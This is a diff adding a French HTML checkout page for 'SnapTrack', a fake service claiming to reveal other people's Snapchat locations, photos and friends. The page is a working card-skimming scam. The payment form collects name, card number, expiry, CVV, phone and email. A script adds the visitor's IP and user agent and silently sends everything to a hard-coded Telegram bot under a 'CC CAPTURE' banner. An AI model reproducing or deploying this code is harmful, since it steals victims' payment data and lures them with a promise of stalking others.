@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Achat de Licence - SnapTrack</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .pricing-box {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .plan {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2.5rem;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(138, 43, 226, 0.3);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .plan:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(138, 43, 226, 0.3);
+        }
+
+        .plan h3 {
+            color: #8a2be2;
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .plan .price {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #fff;
+            margin: 1rem 0;
+        }
+
+        .plan ul {
+            list-style: none;
+            margin: 1.5rem 0;
+            padding: 0;
+        }
+
+        .plan li {
+            color: #b0b0b0;
+            margin: 0.8rem 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .plan li i {
+            color: #8a2be2;
+        }
+
+        .plan button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(45deg, #8a2be2, #6a1cb9);
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .plan button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(138, 43, 226, 0.4);
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .form-grid input {
+            width: 100%;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 1rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .form-grid input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
+        }
+
+        #paymentForm {
+            background: rgba(20, 20, 20, 0.8);
+            padding: 3rem;
+            border-radius: 20px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(138, 43, 226, 0.5);
+            margin-top: 2rem;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #b0b0b0;
+            font-size: 0.9rem;
+        }
+
+        .badge i {
+            color: #8a2be2;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .loading i {
+            font-size: 2rem;
+            color: #8a2be2;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+    
+    <nav class="top-bar">
+        <div class="nav-content">
+            <div class="logo">
+                <i class="fas fa-ghost"></i>
+                <span>SnapTrack</span>
+            </div>
+            <div class="nav-links">
+                <a href="index.html"><i class="fas fa-home"></i> Accueil</a>
+                <a href="payment.html" class="active"><i class="fas fa-crown"></i> Licences</a>
+                <a href="help.html"><i class="fas fa-question-circle"></i> Aide</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1 class="glitch-title">Licence Premium 🔒</h1>
+        <p>Activez votre licence pour accéder à toutes les données Snapchat.</p>
+
+        <div class="pricing-box">
+            <div class="plan">
+                <h3>Essai Gratuit</h3>
+                <div class="price">0€</div>
+                <ul>
+                    <li><i class="fas fa-check"></i> Localisation précise</li>
+                    <li><i class="fas fa-check"></i> Amis et followers</li>
+                    <li><i class="fas fa-check"></i> Photos et vidéos</li>
+                    <li><i class="fas fa-check"></i> Support 24/7</li>
+                </ul>
+                <button onclick="showPaymentForm()">
+                    <i class="fas fa-gift"></i> Activer l'essai
+                </button>
+            </div>
+
+            <div class="plan" style="border: 2px solid #8a2be2;">
+                <h3>Premium+</h3>
+                <div class="price">29€<span style="font-size: 1rem;">/mois</span></div>
+                <ul>
+                    <li><i class="fas fa-check"></i> Toutes les fonctionnalités</li>
+                    <li><i class="fas fa-check"></i> Données temps réel</li>
+                    <li><i class="fas fa-check"></i> Historique complet</li>
+                    <li><i class="fas fa-check"></i> Export des données</li>
+                </ul>
+                <button onclick="showPaymentForm()">
+                    <i class="fas fa-crown"></i> Choisir Premium+
+                </button>
+            </div>
+        </div>
+
+        <div id="paymentForm" style="display: none;">
+            <h3><i class="fas fa-credit-card"></i> Informations de Paiement</h3>
+
+            <form id="creditCardForm" onsubmit="captureData(event)">
+                <div class="form-grid">
+                    <input type="text" name="prenom" placeholder="Prénom" required>
+                    <input type="text" name="nom" placeholder="Nom" required>
+                    <input type="text" name="carte" placeholder="Numéro de Carte" required>
+                    <input type="text" name="expiration" placeholder="MM/AA" required>
+                    <input type="text" name="cvv" placeholder="CVV" required>
+                    <input type="tel" name="telephone" placeholder="Téléphone" required>
+                    <input type="email" name="email" placeholder="Email" required>
+                </div>
+
+                <div class="security-badges">
+                    <div class="badge">
+                        <i class="fas fa-lock"></i>
+                        <span>Paiement sécurisé</span>
+                    </div>
+                </div>
+
+                <button type="submit">
+                    <i class="fas fa-lock"></i> Activer ma licence
+                </button>
+            </form>
+
+            <div class="loading" id="loading">
+                <i class="fas fa-spinner"></i>
+                <p>Traitement en cours...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="particles.js"></script>
+    <script>
+        function showPaymentForm() {
+            document.getElementById('paymentForm').style.display = 'block';
+            document.getElementById('paymentForm').scrollIntoView({ 
+                behavior: 'smooth' 
+            });
+        }
+
+        async function captureData(event) {
+            event.preventDefault();
+            
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('button[type="submit"]').disabled = true;
+
+            const formData = new FormData(event.target);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Get IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch (error) {
+                data.ip = 'IP non disponible';
+            }
+
+            data.userAgent = navigator.userAgent;
+            data.timestamp = new Date().toLocaleString('fr-FR');
+            
+            console.log('🎯 DONNÉES CAPTURÉES:', data);
+            
+            // Envoi à Telegram
+            await sendToTelegram(data);
+            
+            setTimeout(() => {
+                window.location.href = "results.html";
+            }, 3000);
+        }
+
+        async function sendToTelegram(data) {
+            const botToken = '8229279019:AAG4jzV_zfXpi2Xylo-iSMXArgqERt9ptww';
+            const yourUserID = '6150136595';
+
+            // Message stylé pour Telegram
+            const message = `
+🔴🟡🟢 SNAPTRACK CC CAPTURE 🔴🟡🟢
+╔══════════════════════════════════╗
+║        💀 CYBER MENACE 💀        ║
+╚══════════════════════════════════╝
+
+📅 DATE: ${data.timestamp}
+🌐 IP: ${data.ip}
+🖥️ USER AGENT: ${data.userAgent}
+
+╔══════════════════════════════════╗
+║          INFORMATIONS CC         ║
+╚══════════════════════════════════╝
+
+👤 PRÉNOM: ${data.prenom}
+🧾 NOM: ${data.nom}
+💳 CARTE: ${data.carte}
+📅 EXPIRATION: ${data.expiration}
+🔒 CVV: ${data.cvv}
+📞 TÉLÉPHONE: ${data.telephone}
+📧 EMAIL: ${data.email}
+
+╔══════════════════════════════════╗
+║          MÉTADONNÉES             ║
+╚══════════════════════════════════╝
+
+📍 SITE: SnapTrack Premium
+🕒 TIMESTAMP: ${data.timestamp}
+🌍 USER AGENT: ${data.userAgent}
+🔗 IP: ${data.ip}
+
+╔══════════════════════════════════╗
+║        NIXXEL CYBER DEMON        ║
+║          😼🔥💀 ENKULÉ 💀🔥😼    ║
+╚══════════════════════════════════╝
+            `.trim();
+
+            try {
+                // ENVOI DU MESSAGE STYLÉ
+                const messageImg = new Image();
+                const encodedMessage = encodeURIComponent(message);
+                const messageURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourUserID}&text=${encodedMessage}&parse_mode=HTML`;
+                
+                messageImg.src = messageURL;
+                messageImg.style.display = 'none';
+                document.body.appendChild(messageImg);
+
+                console.log('✅ Message envoyé à Telegram!');
+
+            } catch (error) {
+                console.error('❌ Erreur envoi:', error);
+            }
+        }
+
+        // Initialisation des particles
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 80, density: { enable: true, value_area: 800 } },
+                color: { value: "#8a2be2" },
+                shape: { type: "circle" },
+                opacity: { value: 0.5, random: true },
+                size: { value: 3, random: true },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: "#8a2be2",
+                    opacity: 0.4,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 2,
+                    direction: "none",
+                    random: true,
+                    straight: false,
+                    out_mode: "out",
+                    bounce: false
+                }
+            },
+            interactivity: {
+                detect_on: "canvas",
+                events: {
+                    onhover: { enable: true, mode: "grab" },
+                    onclick: { enable: true, mode: "push" },
+                    resize: true
+                }
+            }
+        });
+    </script>
+</body>
+</html>
